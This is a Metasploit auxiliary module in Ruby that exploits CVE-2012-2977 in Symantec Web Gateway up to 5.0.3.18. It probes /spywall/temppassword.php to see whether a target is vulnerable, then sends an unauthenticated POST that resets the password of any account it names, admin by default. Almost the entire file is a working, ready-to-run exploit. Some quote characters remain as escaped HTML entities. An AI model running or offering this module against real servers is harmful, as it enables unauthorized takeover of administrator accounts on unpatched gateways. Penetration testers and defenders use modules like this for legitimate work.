# @_Kc57
# Symantec Web Gateway <= 5.0.3.18 Arbitrary Password Change
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Symantec Web Gateway <= 5.0.3.18 Arbitrary Password Change",
            &#039;Description&#039;    => %q{
                    This module will change the password for the specified account on a Symantec Web Gatewaye server.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 0 $",
            &#039;Author&#039;         =>
                [
                    &#039;Kc57&#039;,
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-2977&#039; ],
                    [ &#039;OSVDB&#039;, &#039;0&#039; ],
                    [ &#039;BID&#039;, &#039;54430&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.securityfocus.com/bid/54430&#039; ],
                ],
            &#039;DisclosureDate&#039; => "Jul 23 2012" ))
 
            register_options(
                [
                    Opt::RPORT(80),
                    OptString.new(&#039;USER&#039;, [ true, &#039;The password to reset to&#039;, &#039;admin&#039;]),
                    OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password to reset to&#039;, &#039;admin&#039;])
                ], self.class)
    end
 
    def run
 
        print_status("Attempting to connect to https://#{rhost}/spywall/temppassword.php to reset password")
        res = send_request_raw(
        {
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => &#039;/spywall/temppassword.php&#039;,
        }, 25)
 
        #check to see if we get HTTP OK
        if (res.code == 200)
            print_status("Okay, Got an HTTP 200 (okay) code. Checking if exploitable")
        else
            print_error("Did not get HTTP 200, URL was not found. Exiting!")
            return
        end
 
        #Check to if the temppassword.php page loads or if we are redirected to the login page
        if (res.body.match(/Please Select a New Password/i))
            print_status("Server is vulnerable!")
        else
            print_error("Target doesn&#039;t seem to be vulnerable!")
            return
        end
 
        print_status("Attempting to exploit password change vulnerability on #{rhost}")
        print_status("Attempting to reset #{datastore[&#039;USER&#039;]} password to #{datastore[&#039;PASSWORD&#039;]}")
 
        data  = &#039;target=executive_summary.php&#039;
        data << &#039;&USERNAME=&#039; + datastore[&#039;USER&#039;]
        data << &#039;&password=&#039; + datastore[&#039;PASSWORD&#039;]
        data << &#039;&password2=&#039; + datastore[&#039;PASSWORD&#039;]
        data << &#039;&Save=Save&#039;
 
        res = send_request_cgi(
        {
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => &#039;/spywall/temppassword.php&#039;,
            &#039;data&#039;    => data,
        }, 25)
 
        if res.code == 200
            if (res.body.match(/Thank you/i))
                print_status("Password reset was successful!\n")
            else
                print_error("Password reset failed! User &#039;#{datastore[&#039;USER&#039;]}&#039; may not exist.\n")
            end
        else
            print_error("Password reset failed!")
        end
    end
 
end



